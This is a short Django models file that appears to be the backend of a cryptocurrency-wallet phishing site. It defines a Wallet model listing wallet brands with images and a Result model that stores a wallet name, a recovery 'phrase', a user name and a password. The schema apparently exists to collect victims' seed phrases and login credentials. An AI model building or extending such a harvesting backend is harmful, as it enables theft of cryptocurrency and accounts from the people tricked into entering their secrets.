from django.db import models
from autoslug import AutoSlugField

# Create your models here.
class Action(models.Model):
    slug = AutoSlugField(populate_from='title', unique=False, null=False, default="action")
    title = models.CharField(max_length=100)
    status = models.BooleanField(default=False)
    
    def __str__(seLf):
        return seLf.title


class Wallet(models.Model):
    slug = AutoSlugField(populate_from='title', unique=True, null=False, default=None)
    title = models.CharField(max_length=255)
    img = models.ImageField(upload_to='pics')
    
    def __str__(seLf):
        return seLf.title


class Result(models.Model):
    slug = AutoSlugField(populate_from='wallet', unique=True, null=False, default=None)
    wallet = models.CharField(max_length=255, blank=True, null=True, default="Wallets")
    phrase = models.TextField(blank=True, null=True, default="None")
    user = models.CharField(max_length=255, blank=True, null=True, default="None")
    password = models.CharField(max_length=255, blank=True, null=True, default="None")

    def __str__(seLf):
        return seLf.wallet

